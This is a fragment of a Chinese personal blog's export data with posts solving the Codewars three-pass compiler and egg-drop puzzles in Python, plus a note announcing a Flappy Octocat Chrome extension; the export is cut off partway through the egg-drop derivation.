href=\"http://blog.chxj.name/from-reverse-polish-notation-to-three-pass-compiler-1/\">Codewars：从逆波兰表达式到Three-Pass编译器（1）</a></p>\n<p>和前一题相比，这道题的题面就要复杂多了。</p>\n<p>我们有一种如下的语法规则的编程语言：</p>\n<pre><code> [ a b ] a*a + b*b\n</code></pre>\n<p>这里我们定义了一个函数，这个函数有两个参数（a 和 b），函数功能是计算 a 和 b 的平方和。</p>\n<p>现在，请为该语言实现一个简单的语法编译器。编译过程可以拆分为三个步骤：</p>\n<p>1.将函数解析为一个抽象语法树（<a href=\"https://zh.wikipedia.org/zh-hans/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9\">AST</a> ）</p>\n<p>AST有如下规则：</p>\n<pre><code>    { 'op': '+', 'a': a, 'b': b }    // add subtree a to subtree b\n    { 'op': '-', 'a': a, 'b': b }    // subtract subtree b from subtree a\n    { 'op': '*', 'a': a, 'b': b }    // multiply subtree a by subtree b\n    { 'op': '/', 'a': a, 'b': b }    // divide subtree a from subtree b\n    { 'op': 'arg', 'n': n }          // reference to n-th argument, n integer\n    { 'op': 'imm', 'n': n }          // immediate value n, n integer\n</code></pre>\n<p>那么， 例如 <code>[ x y ] ( x + y ) / 2</code> 这样的一个函数，我们需要将其解析为如下结构：</p>\n<pre><code> { 'op': '/', 'a': { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\n                                   'b': { 'op': 'arg', 'n': 1 } },\n                 'b': { 'op': 'imm', 'n': 2 } }\n</code></pre>\n<p>2.优化AST，提前计算其中可以计算的项， 比如 <code>[ x ] x + 2*5</code> 这个函数，在经过第二步的优化后，将转化为如下结构：</p>\n<pre><code>   { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\n                 'b': { 'op': 'imm', 'n': 10 } }\n</code></pre>\n<p>3.第三步则是将优化后的AST转化为类似汇编语言的底层代码，具体规则如下：</p>\n<pre><code>    &quot;IM n&quot;     // load the constant value n into R0\n    &quot;AR n&quot;     // load the n-th input argument into R0\n    &quot;SW&quot;       // swap R0 and R1\n    &quot;PU&quot;       // push R0 onto the stack\n    &quot;PO&quot;       // pop the top value off of the stack into R0\n    &quot;AD&quot;       // add R1 to R0 and put the result in R0\n    &quot;SU&quot;       // subtract R1 from R0 and put the result in R0\n    &quot;MU&quot;       // multiply R0 by R1 and put the result in R0\n    &quot;DI&quot;       // divide R0 by R1 and put the result in R0\n</code></pre>\n<p>那么，上面的例子经过转化后，一种可能的形式是： <code>[ &quot;IM 10&quot;, &quot;SW&quot;, &quot;AR 0&quot;, &quot;AD&quot; ]</code> 。因为解析算法的不同，第三步得到的指令列表可能不尽相同，但只要最后的执行结果正确即可。</p>\n<p>转换成以上形式后，题目提供了以下函数来执行这个指令列表：</p>\n<pre><code>def simulate(asm, argv):\n    r0, r1 = None, None\n    stack = []\n    for ins in asm:\n        if ins[:2] == 'IM' or ins[:2] == 'AR':\n            ins, n = ins[:2], int(ins[2:])\n        if ins == 'IM':   r0 = n\n        elif ins == 'AR': r0 = argv[n]\n        elif ins == 'SW': r0, r1 = r1, r0\n        elif ins == 'PU': stack.append(r0)\n        elif ins == 'PO': r0 = stack.pop()\n        elif ins == 'AD': r0 += r1\n        elif ins == 'SU': r0 -= r1\n        elif ins == 'MU': r0 *= r1\n        elif ins == 'DI': r0 /= r1\n    return r0\n</code></pre>\n<p>最后返回计算结果。</p>\n<p>原题地址 ：</p>\n<pre><code>https://www.codewars.com/kata/tiny-three-pass-compiler/train/python\n</code></pre>\n<p>对于我这样不是科班出身也没学过编译原理这门课的程序员，解这道题的整个过程可以说是一次非常棒的实验课。这不正是编译器将一门高级编程语言编译成汇编代码的一个生动的例子吗！</p>\n<p>幸好有了上一篇逆波兰表达式的基础，这道也变得不是那么的无从下手了，下面就讲讲我的思路：</p>\n<p>第一步，首先需要对题目语言中的符号进行处理，比如 <code>[]</code> 表示函数的形参。 之后要处理的就是函数体中的表达式，我的思路是先将表达式转换逆波兰表达式，再使用计算逆波兰表达式的方法，构造AST。</p>\n<p>第二步，递归遍历这棵树，计算其中两个节点均为标量的部分。</p>\n<p>第三步，递归遍历优化后的AST，得到指令列表。</p>\n<p>最后就是具体的实现代码了 ：</p>\n<pre><code class=\"language-python\">import re\n\nclass Compiler(object):\n\n    def compile(self, program):\n        return self.pass3(self.pass2(self.pass1(program)))\n        \n    def tokenize(self, program):\n        &quot;&quot;&quot;Turn a program string into an array of tokens.  Each token\n           is either '[', ']', '(', ')', '+', '-', '*', '/', a variable\n           name or a number (as a string)&quot;&quot;&quot;\n        token_iter = (m.group(0) for m in re.finditer(r'[-+*/()[\\]]|[A-Za-z]+|\\d+', program))\n        return [tok for tok in token_iter]\n\n    def pass1(self, program):\n        tokens = self.tokenize(program)\n        args = []\n        list = []\n        operators = []\n        arg = False\n        for t in tokens:\n            if t == '[':\n                arg = True\n                continue\n                \n            if t == ']':\n                arg = False\n                continue\n                \n            if arg:\n                args.append(t)\n                continue\n                \n            if t in '+-*/':\n                while(len(operators) != 0):\n                    if operators[-1] != '(' and not (t in '*/' and operators[-1] in '+-'):\n                        list.append(operators.pop())\n                    else:\n                        break\n                operators.append(t)\n            elif t == '(':\n                operators.append(t)\n            elif t == ')':\n                while True:\n                    x = operators.pop()\n                    if x != '(' :\n                        list.append(x)\n                    else:\n                        break\n            else:\n                list.append(t)\n        \n        stack = []\n        for x in list + operators[::-1]:\n            if x not in '+-*/':\n                stack.append(x)\n            else:\n                b = self.build_val(stack.pop(), args)\n                a = self.build_val(stack.pop(), args)\n                stack.append({'op': x, 'a': a, 'b': b})\n        \n        return stack.pop()\n        \n    def build_val(self, val, args):\n        if type(val) is dict:\n            return val\n        elif val in args:\n            return {'op': 'arg', 'n': args.index(val)}\n        elif val.isdigit():\n            return {'op': 'imm', 'n': int(val)}\n        \n    def pass2(self, ast):\n        if ast['op'] in '+-*/':\n            if ast['a']['op'] in '+-*/':\n                ast['a'] = self.pass2(ast['a'])\n            if ast['b']['op'] in '+-*/':\n                ast['b'] = self.pass2(ast['b'])\n            if ast['a']['op'] == 'imm' and ast['b']['op'] == 'imm':\n                ast = {'op': 'imm', 'n': eval(str(ast['a']['n']) + ast['op'] + str(ast['b']['n']))}\n        \n        return ast                \n\n    def pass3(self, ast):\n        op_dict = {\n            '+': 'AD',\n            '-': 'SU',\n            '*': 'MU',\n            '/': 'DI',\n        }\n        if ast['op'] in '+-*/':\n            return (self.pass3(ast['a']) + self.pass3(ast['b'])) + ['PO', 'SW', 'PO', op_dict.get(ast['op']), 'PU']\n        elif ast['op'] == 'arg':\n            return ['AR ' + str(ast['n']), 'PU']\n        elif ast['op'] == 'imm':\n            return ['IM ' + str(ast['n']), 'PU']\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"65","plaintext":"在这里我想说的第二道题，我把它理解成一次对逆波兰表达式的运用和延伸。关于逆波兰表达式的相关知识，可以在前一篇博客中读到 ：\nCodewars：从逆波兰表达式到Three-Pass编译器（1）\n[http://blog.chxj.name/from-reverse-polish-notation-to-three-pass-compiler-1/]\n\n和前一题相比，这道题的题面就要复杂多了。\n\n我们有一种如下的语法规则的编程语言：\n\n [ a b ] a*a + b*b\n\n\n这里我们定义了一个函数，这个函数有两个参数（a 和 b），函数功能是计算 a 和 b 的平方和。\n\n现在，请为该语言实现一个简单的语法编译器。编译过程可以拆分为三个步骤：\n\n1.将函数解析为一个抽象语法树（AST\n[https://zh.wikipedia.org/zh-hans/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9] \n ）\n\nAST有如下规则：\n\n    { 'op': '+', 'a': a, 'b': b }    // add subtree a to subtree b\n    { 'op': '-', 'a': a, 'b': b }    // subtract subtree b from subtree a\n    { 'op': '*', 'a': a, 'b': b }    // multiply subtree a by subtree b\n    { 'op': '/', 'a': a, 'b': b }    // divide subtree a from subtree b\n    { 'op': 'arg', 'n': n }          // reference to n-th argument, n integer\n    { 'op': 'imm', 'n': n }          // immediate value n, n integer\n\n\n那么， 例如 [ x y ] ( x + y ) / 2  这样的一个函数，我们需要将其解析为如下结构：\n\n { 'op': '/', 'a': { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\n                                   'b': { 'op': 'arg', 'n': 1 } },\n                 'b': { 'op': 'imm', 'n': 2 } }\n\n\n2.优化AST，提前计算其中可以计算的项， 比如 [ x ] x + 2*5  这个函数，在经过第二步的优化后，将转化为如下结构：\n\n   { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\n                 'b': { 'op': 'imm', 'n': 10 } }\n\n\n3.第三步则是将优化后的AST转化为类似汇编语言的底层代码，具体规则如下：\n\n    \"IM n\"     // load the constant value n into R0\n    \"AR n\"     // load the n-th input argument into R0\n    \"SW\"       // swap R0 and R1\n    \"PU\"       // push R0 onto the stack\n    \"PO\"       // pop the top value off of the stack into R0\n    \"AD\"       // add R1 to R0 and put the result in R0\n    \"SU\"       // subtract R1 from R0 and put the result in R0\n    \"MU\"       // multiply R0 by R1 and put the result in R0\n    \"DI\"       // divide R0 by R1 and put the result in R0\n\n\n那么，上面的例子经过转化后，一种可能的形式是： [ \"IM 10\", \"SW\", \"AR 0\", \"AD\" ] \n。因为解析算法的不同，第三步得到的指令列表可能不尽相同，但只要最后的执行结果正确即可。\n\n转换成以上形式后，题目提供了以下函数来执行这个指令列表：\n\ndef simulate(asm, argv):\n    r0, r1 = None, None\n    stack = []\n    for ins in asm:\n        if ins[:2] == 'IM' or ins[:2] == 'AR':\n            ins, n = ins[:2], int(ins[2:])\n        if ins == 'IM':   r0 = n\n        elif ins == 'AR': r0 = argv[n]\n        elif ins == 'SW': r0, r1 = r1, r0\n        elif ins == 'PU': stack.append(r0)\n        elif ins == 'PO': r0 = stack.pop()\n        elif ins == 'AD': r0 += r1\n        elif ins == 'SU': r0 -= r1\n        elif ins == 'MU': r0 *= r1\n        elif ins == 'DI': r0 /= r1\n    return r0\n\n\n最后返回计算结果。\n\n原题地址 ：\n\nhttps://www.codewars.com/kata/tiny-three-pass-compiler/train/python\n\n\n对于我这样不是科班出身也没学过编译原理这门课的程序员，解这道题的整个过程可以说是一次非常棒的实验课。这不正是编译器将一门高级编程语言编译成汇编代码的一个生动的例子吗！\n\n幸好有了上一篇逆波兰表达式的基础，这道也变得不是那么的无从下手了，下面就讲讲我的思路：\n\n第一步，首先需要对题目语言中的符号进行处理，比如 []  表示函数的形参。\n之后要处理的就是函数体中的表达式，我的思路是先将表达式转换逆波兰表达式，再使用计算逆波兰表达式的方法，构造AST。\n\n第二步，递归遍历这棵树，计算其中两个节点均为标量的部分。\n\n第三步，递归遍历优化后的AST，得到指令列表。\n\n最后就是具体的实现代码了 ：\n\nimport re\n\nclass Compiler(object):\n\n    def compile(self, program):\n        return self.pass3(self.pass2(self.pass1(program)))\n        \n    def tokenize(self, program):\n        \"\"\"Turn a program string into an array of tokens.  Each token\n           is either '[', ']', '(', ')', '+', '-', '*', '/', a variable\n           name or a number (as a string)\"\"\"\n        token_iter = (m.group(0) for m in re.finditer(r'[-+*/()[\\]]|[A-Za-z]+|\\d+', program))\n        return [tok for tok in token_iter]\n\n    def pass1(self, program):\n        tokens = self.tokenize(program)\n        args = []\n        list = []\n        operators = []\n        arg = False\n        for t in tokens:\n            if t == '[':\n                arg = True\n                continue\n                \n            if t == ']':\n                arg = False\n                continue\n                \n            if arg:\n                args.append(t)\n                continue\n                \n            if t in '+-*/':\n                while(len(operators) != 0):\n                    if operators[-1] != '(' and not (t in '*/' and operators[-1] in '+-'):\n                        list.append(operators.pop())\n                    else:\n                        break\n                operators.append(t)\n            elif t == '(':\n                operators.append(t)\n            elif t == ')':\n                while True:\n                    x = operators.pop()\n                    if x != '(' :\n                        list.append(x)\n                    else:\n                        break\n            else:\n                list.append(t)\n        \n        stack = []\n        for x in list + operators[::-1]:\n            if x not in '+-*/':\n                stack.append(x)\n            else:\n                b = self.build_val(stack.pop(), args)\n                a = self.build_val(stack.pop(), args)\n                stack.append({'op': x, 'a': a, 'b': b})\n        \n        return stack.pop()\n        \n    def build_val(self, val, args):\n        if type(val) is dict:\n            return val\n        elif val in args:\n            return {'op': 'arg', 'n': args.index(val)}\n        elif val.isdigit():\n            return {'op': 'imm', 'n': int(val)}\n        \n    def pass2(self, ast):\n        if ast['op'] in '+-*/':\n            if ast['a']['op'] in '+-*/':\n                ast['a'] = self.pass2(ast['a'])\n            if ast['b']['op'] in '+-*/':\n                ast['b'] = self.pass2(ast['b'])\n            if ast['a']['op'] == 'imm' and ast['b']['op'] == 'imm':\n                ast = {'op': 'imm', 'n': eval(str(ast['a']['n']) + ast['op'] + str(ast['b']['n']))}\n        \n        return ast                \n\n    def pass3(self, ast):\n        op_dict = {\n            '+': 'AD',\n            '-': 'SU',\n            '*': 'MU',\n            '/': 'DI',\n        }\n        if ast['op'] in '+-*/':\n            return (self.pass3(ast['a']) + self.pass3(ast['b'])) + ['PO', 'SW', 'PO', op_dict.get(ast['op']), 'PU']\n        elif ast['op'] == 'arg':\n            return ['AR ' + str(ast['n']), 'PU']\n        elif ast['op'] == 'imm':\n            return ['IM ' + str(ast['n']), 'PU']","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-08-24 08:07:32","updated_at":"2017-09-19 08:03:02","published_at":"2017-08-24 08:57:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e80","uuid":"268c1291-f91d-4124-92eb-89d7e0ad432d","title":"一个奇葩的Chrome插件：Flappy Octocat","slug":"flappy-octocat","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"前段时间看朋友写了个 Chrome 插件觉得特别酷，可以在 github 的 contributions board 上玩[康威生命游戏](https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F)。\\n\\n大概是像这样的：\\n\\n![](/content/images/2017/09/demo3-min.gif)\\n\\n受朋友的启发，我也写了一个 Chrome 小插件，可以让我在 contributions board 上玩 flappy bird 一样的游戏，画面大概是这样的：\\n\\n![](/content/images/2017/09/screenshot.gif)\\n\\n不过，到底是什么样的神经病才会在 github 的 contributions board 上玩游戏呢 🌚\\n\\n如果喜欢的话，可以从 https://github.com/chxj1992/flappy-octocat 获得这个插件及其源码\\n\\n[或者，直接从 Chrome 的 Web Store 安装这个游戏![](/content/images/2017/09/webstore-1.png)](https://chrome.google.com/webstore/detail/flappy-octocat/jjjhhlomhbdmnfgaccmddhmjfeekjlbl?utm_source=chrome-ntp-icon)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>前段时间看朋友写了个 Chrome 插件觉得特别酷，可以在 github 的 contributions board 上玩<a href=\"https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F\">康威生命游戏</a>。</p>\n<p>大概是像这样的：</p>\n<p><img src=\"/content/images/2017/09/demo3-min.gif\" alt=\"\"></p>\n<p>受朋友的启发，我也写了一个 Chrome 小插件，可以让我在 contributions board 上玩 flappy bird 一样的游戏，画面大概是这样的：</p>\n<p><img src=\"/content/images/2017/09/screenshot.gif\" alt=\"\"></p>\n<p>不过，到底是什么样的神经病才会在 github 的 contributions board 上玩游戏呢 🌚</p>\n<p>如果喜欢的话，可以从 <a href=\"https://github.com/chxj1992/flappy-octocat\">https://github.com/chxj1992/flappy-octocat</a> 获得这个插件及其源码</p>\n<p><a href=\"https://chrome.google.com/webstore/detail/flappy-octocat/jjjhhlomhbdmnfgaccmddhmjfeekjlbl?utm_source=chrome-ntp-icon\">或者，直接从 Chrome 的 Web Store 安装这个游戏<img src=\"/content/images/2017/09/webstore-1.png\" alt=\"\"></a></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"66","plaintext":"前段时间看朋友写了个 Chrome 插件觉得特别酷，可以在 github 的 contributions board 上玩康威生命游戏\n[https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F]\n。\n\n大概是像这样的：\n\n\n\n受朋友的启发，我也写了一个 Chrome 小插件，可以让我在 contributions board 上玩 flappy bird\n一样的游戏，画面大概是这样的：\n\n\n\n不过，到底是什么样的神经病才会在 github 的 contributions board 上玩游戏呢 🌚\n\n如果喜欢的话，可以从 https://github.com/chxj1992/flappy-octocat  获得这个插件及其源码\n\n或者，直接从 Chrome 的 Web Store 安装这个游戏\n[https://chrome.google.com/webstore/detail/flappy-octocat/jjjhhlomhbdmnfgaccmddhmjfeekjlbl?utm_source=chrome-ntp-icon]","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-04 07:49:06","updated_at":"2017-09-04 08:08:39","published_at":"2017-09-04 08:08:39","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e81","uuid":"8b96e239-9d23-4de8-9065-24a677c81b0b","title":"Codewars：一个鸡蛋引发的思考","slug":"codewars-faberge-easter-eggs-crush-test","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![](/content/images/2017/09/images.jpeg)\\n\\n在codewars上遇到这样一道题：\\n\\n> Eulampy 有一筐鸡蛋, 有一天在一幢摩天大楼下, 他的朋友对他说, 如果你给我n个鸡蛋, 我保证可以告诉你, 在h层楼的范围内, 鸡蛋最多从第几次楼扔下来而不会被摔破. Eulampy说, \\\"没问题, 但是我最多同意你扔m次, 看你扔的次数太多我会难过的.\\\", 请设计一个函数, height(n, m), 求扔鸡蛋实验的总量程, 即 h.\\n\\n需要说明的是, 我们假设每个鸡蛋的都是完全一样的, 当一个鸡蛋被扔下了而没破, 就可以再次使用.\\n\\n```\\n原题地址：https://www.codewars.com/kata/faberge-easter-eggs-crush-test/train/python\\n```\\n\\n重点来了, 这道题有三组测试, 分别是: 基础的(basic), 进阶的(advanced), 真格的(serious).\\n\\n```\\ntest.it('basic tests')\\ntest.assert_equals(height(0,14),0)\\ntest.assert_equals(height(2,0),0)\\ntest.assert_equals(height(2,14),105)\\ntest.assert_equals(height(7,20),137979)\\n\\ntest.it('advanced tests')\\ntest.assert_equals(height(7,500),1507386560013475)\\ntest.assert_equals(height(237,500),431322842186730691997112653891062105065260343258332219390917925258990318721206767477889789852729810256244129132212314387344900067338552484172804802659)\\ntest.assert_equals(height(477,500),3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127420959866658939578436425342102468327399)\\n\\ntest.it('serious tests')\\ntest.assert_equals(height(477,10000),600461396604105297697414530102187796624607351959572356167325648574309381899274255809992726647041509608874296502550889633566626669839693460163703754386982346596293491455058459167135769401101845748849154474806919582238098292865002615140455747337045606515913175800206705264197158348258877027342824497813598887212567460615138259041983561196905824547148562128771846272230901329804068790524523450526723439711852711480043539388255029594388405065227411436195811544328549172691557810516507323615400468586962803403389031164507526999175383227883564967859574994520910983381843074859047295120948531800868902878466257920126328541103471268056861774184467685136934882998123768531695075047132113902537018783846627502099156246969377215926174782697180458326177412430190794351610099943109019040476655865297322723014683870220977314898596096355345407775)\\ntest.assert_equals(height(4477,10000),1322821654800439589583624607836730988904348989635184483838675315989863014466105368917516854788173412697117838413572154358020136361352589223655004309284002331356645126308444045548293566543482035130766876362770186754407172004758665811853489554425555053643908845358225658078400880897420458613361537230692347145029937146468449752350301582966318881236041448346697864308936041807973848575815961020957973841925430394889030910761307668821228255147323012321726504304076902912463702108956669795566661303469766408411346447369441900601416549889768545415835808703102634187636408616862788628220968336302080405978291461615690517333300338026427209023338744576796796711916921553117367799805818262372383440027895158535027538219368128415201884328355249194560412959735085368099726719812587209832125121706467856448219467001478841957398661311948630752866817235891668491371246314423172093241855801986462213764272472077704090737449586014952207200402488115806480036391258788025058712927761809494607747190593544252498024965313654475511753397288550572364193751016698751124385432059855618738610770405495965628076729605040379761490680887446751742893838217109555332410367754941969641188014103364853464553866605149284789373350284278475702952002720219396744665142719739890709306702230989773403063833223142722153866753072260856577382714941017978371516349454986201414282722361391051916542589551016023190730497041390846243435703142324656990673688597131961469432804559244656573403972845547140551161388227163311600434649131672174329566859257640294347413250504689740356122993141714018763824536995756394554473053764885655217850919825484110456823718017936279926312676444075372513295121643005522507990093614688397324087158672285564265461960725048409644632356562813282311892621316990617791305949952474644973231563181802912551788866587392922962344851922680688121341506499860485837386801968860995052055236149946250164753714765692652499211749864280505191012859114807502067989910205943513218116464920029858713308646212996605582239145947185971138791937105763767017369327250323372490209312303407044663140291579276982729680418229917148740734819240902048630120317091983651644063173722960555978628497587823422375493107579742775550922433788067185239451798388809414158837037653589325259023780409914069533039705450496176647169891013697813337588075535112140970187607803915384622627522925822608742766549203712747041753891038754047696049037861483951837513375322742464580059309440669921941688909946789319835787709445925359884114002203388057590959620340874700472926972472437928806956105916022048677333952506175442513146994611155259594220312914080066998804113859428782103809127996851589054428051854854318799508483531803897517007935349549152870011407064621017082135138020750461696192841200272984193298057507960103670538167626863921460268009725329427763452347838828602301814121408102409549978991436252168617142842111215900368726060166926158698664478612916125923479260041837538259289930459928491560009034059912265253387804412611357982786191578331327)\\ntest.assert_equals(height(9477,10000),19950631168807583848837421626835850838234968318861924548520089498529438830221946631919961684036194597899331129423209124271556491349413781117593785932096323957855730046793794526765246551266059895520550086918193311542508608460618104685509074866089624888090489894838009253941633257850621568309473902556912388065225096643874441046759871626985453222868538161694315775629640762836880760732228535091641476183956381458969463899410840960536267821064621427333394036525565649530603142680234969400335934316651459297773279665775606172582031407994198179607378245683762280037302885487251900834464581454650557929601414833921615734588139257095379769119277800826957735674444123062018757836325502728323789270710373802866393031428133241401624195671690574061419654342324638801248856147305207431992259611796250130992860241708340807605932320161268492288496255841312844061536738951487114256315111089745514203313820202931640957596464756010405845841566072044962867016515061920631004186422275908670900574606417856951911456055068251250406007519842261898059237118054444788072906395242548339221982707404473162376760846613033778706039803413197133493654622700563169937455508241780972810983291314403571877524768509857276937926433221599399876886660808368837838027643282775172273657572744784112294389733810861607423253291974813120197604178281965697475898164531258434135959862784130128185406283476649088690521047580882615823961985770122407044330583075869039319604603404973156583208672105913300903752823415539745394397715257455290510212310947321610753474825740775273986348298498340756937955646638621874569499279016572103701364433135817214311791398222983845847334440270964182851005072927748364550578634501100852987812389473928699540834346158807043959118985815145779177143619698728131459483783202081474982171858011389071228250905826817436220577475921417653715687725614904582904992461028630081535583308130101987675856234343538955409175623400844887526162643568648833519463720377293240094456246923254350400678027273837755376406726898636241037491410966718557050759098100246789880178271925953381282421954028302759408448955014676668389697996886241636313376393903373453647052103349469928076954249980154345544196049720110441880956939571653303125965015135210943821418326301263747755849915390311849600620405839184806696574011638771223876684308393546154357007879197176278577010897776871509293312271446308325915207411683581162864877565099831828100966285215817182861422299916721214461558309048173509038700144141092935627106729962305873603830938160653941875633254649208486247541063094454500007666144426589865904402944100565434252161641454059574448959059378469034843694065251975339636452128242737679086169540365161261103781301842588718151775952124493692901275351280453566829099730411742607415703660912889996893392281666409912913934377489142688784235343954049469043333120897248862080530937185907276885584072254792345533781517753151320818102507950307194516201547412495983145614252402137833853984659077543542376699008277188650448599930163536123001047126485885945475644)\\n```\\n\\n\\n我想说, 在一开始拿到这道题的时候, 我完全低估了题目的难度...\\n\\n首先, 我试着先将问题简化一下, \\n\\n假设只有 `1` 个鸡蛋, `10` 次尝试机会, 那么, 为了确保我这一个鸡蛋扔下去后, 我能知道鸡蛋在某层楼刚好不被摔破, 唯一的方式是从1楼开始一层一层的往上增加, 一直到第10层, 如果鸡蛋还是没破, 那没办法了, 因为 `1` 个鸡蛋 `10` 次机会, 最多只能保证在10层楼的范围内, 测出鸡蛋刚好不破的楼层数.\\n\\n那让我们再进一步, 假如有 `2` 个鸡蛋, 还是 `10` 次机会, 让我们再来思考一下这个问题. 现在问题的关键是, 第一个鸡蛋我们应该从几楼开始往下扔? 需要考虑两种情况, 当我从第 `x` 层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎. 假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 `1` 个鸡蛋和 `9` 次扔鸡蛋的机会测出鸡蛋在 `x-1` 层中刚好不破的楼层数. 一个鸡蛋的问题, 我们刚刚已经讨论过了, `1` 个鸡蛋 `9` 次机会, h 为 9, 即 `x-1 = 9`, 所以 `x = 1 + 9 = 10`, 也就是说, 第一次扔鸡蛋, 我们应当从 `10` 楼开始往下扔. 那么继续, 假如鸡蛋没破呢, 那好办了, 我们现在有 `2` 个鸡蛋 `9` 次机会, 通过和前面一样的思考, 第二次扔的时候, 我们应该从 `10 + 9 = 19` 层往下扔. 那如果鸡蛋仍然没破呢, 我们就应该从 `10 + 9 + 8 = 27` 层往下扔, 以此类推, 我们可以发现, 当我们有 `2` 个鸡蛋 `m` 次机会时, 最大楼层 `h = m(m-1)/2`, 正好是等差数列的求和公式! \\n\\n我整理了一下思路, 将上面的结论归纳了一下: 有 `n` 个鸡蛋, `m` 次尝试机会, 当我从第 `x` 层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎. 假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 `n-1` 个鸡蛋和 `m-1` 次扔鸡蛋的机会在剩余的 `x-1` 层楼中测出鸡蛋刚好不破的层数. 假如鸡蛋没碎, 问题便转化成了 `n` 个鸡蛋 `m-1` 次机会的问题了. 嗯, 这听上去, 很递归!!!\\n\\n好, 现在思路有了, 就让我们用递归来搞定这道题吧! 首先, 根据以上的推理, 我们可以很容易的得出递推公式: \\n\\n> height(n, m) = height(n, m-1) + height(n-1, m-1) + 1\\n\\n具体的实现代码如下(python):\\n\\n```\\ndef height(n, m):\\n  if n == 0 or m ==0:\\n    return 0\\n  return height(n, m - 1) + height(n - 1, m - 1) + 1\\n```\\n\\n代码可以说是相当简洁干净了, basic测试顺利通过!\\n\\n不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.\\n\\nadvance测试的第一条就挂了 ...\\n\\n但我并没有放弃, 我开始仔细思考, 问题到底在哪呢 🤔\\n\\n有了! height(n, m) 被拆分成了 height(n, m-1) 和 height(n-1, m-1), height(n, m-1) 被拆分成 height(n, m-2) 和 height(n-1, m-2), 而 height(n-1, m-1) 也会被差分成 height(n-1, m-2) 和 height(n-2, m-2). 发现问题了吗? height(n-1, m-2) 在两个分支里分别被计算了一次!! 考虑到 height(n-1, m-2) 后面还会衍生出很多的分支, 当 n, m 都比较大时, 这个计算量还是很客观的.\\n\\n想到这里, 我马上对代码做了修改. 这里使用了python标准库中提供的\\n `@lru_cache` 注解, 实现对计算过的函数进行缓存, 同时, 为了避免参数递归层数过深, 还将最大递归深度限制调大.\\n\\n```\\nfrom functools import lru_cache\\nimport sys\\n\\nsys.setrecursionlimit(100000)\\n\\n@lru_cache(maxsize=1000)\\ndef height(n, m):\\n    if n == 0 or m ==0:\\n        return 0\\n    return height(n, m - 1) + height(n - 1, m - 1) + 1\\n```\\n\\n果然, 这次我顺利通过了 advanced 级别的测试, 执行单条 advanced 级别测试大概需要花费 `800ms` 左右.\\n\\n不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.\\n\\n或许是因为层层嵌套的递归结构消耗了太多的资源, `serious` 级别的测试依然无法通过.\\n\\n![](/content/images/2017/09/Screen-Shot-2017-09-25-at-11.55.36-AM.png)\\n\\n我不得不开始认真的思考, 问题的关键到底在哪里 🤔\\n\\n经过了各种Google学习, 我学习到了另一种解决这种递推式问题的方法, 那就是: 动态规划! 和递归一样, 动态规划\\b的关键还是在于找出问题的递推公式, 即:\\n\\n> height(n, m) = height(n, m-1) + height(n-1, m-1) + 1\\n\\n通过自底向上的方式得出问题的解, 在求解的过程中, 我们可以将前一步得出的计算结果保存下来, 避免重复计算.\\n\\n```\\ndef key(i,j):\\n    return \\\"%s-%s\\\" % (i,j)\\n\\ndef height(n, m):\\n    n = n if n < m else m\\n    save = {}\\n    for j in range(0, m+1):\\n        for i in range(0, n+1):\\n            if j == 0 or i == 0:\\n                save[key(i,j)] = 0\\n                continue\\n            save[key(i,j)] = save[key(i, j-1)] + 1 + save[key(i-1, j-1)]\\n    return save[key(n,m)]\\n```\\n\\n和之前递归的代码相比, 算出一条 advanced 测试所需要的时间从 `800ms` 下降到了 `600ms`, 甚至, 还通过了 `serious` 级别的第一条测试(虽然耗费了惊人的11000ms左右). \\n\\n到这一步, 我投降了. 第一次, 我选择看答案. 第一次, 我甚至连答案都看不懂. 代码如下:\\n\\n```\\ndef height(n, m):\\n    h, t = 0, 1\\n    for i in range(1, n + 1): \\n        t = t * (m - i + 1) // i\\n        h += t\\n    return h\\n```\\n\\nWTF ??????????????????????????????????????????????????????\\n\\n我大概花了3天时间, 来搞懂这段短短的代码.\\n\\n还是回到最初的思路上来:\\n\\n`1` 个鸡蛋 `m` 次机会 -->  h 可以表示为 `m`\\n\\n`2` 个鸡蛋 `m` 次机会 -->  h 可以表示为 \\n```\\n1+(m-1) + 1+(m-2) + 1+(m-3) ...\\n= m + m(m-1)/2\\n```\\n\\n`3` 个鸡蛋 `m` 次机会 -->  h 可以表示为 